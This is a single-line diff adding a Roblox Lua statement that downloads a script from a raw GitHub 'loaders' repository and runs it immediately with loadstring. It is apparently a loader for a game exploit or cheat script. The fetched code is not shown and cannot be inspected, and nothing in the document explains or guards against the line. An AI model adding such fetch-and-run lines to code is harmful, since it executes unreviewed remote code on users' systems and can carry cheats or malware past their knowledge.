@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TealKnightFree/loaders/main/loaders/hide-in-pixels-spam5-cmgd3gkxo797q4.lua"))()
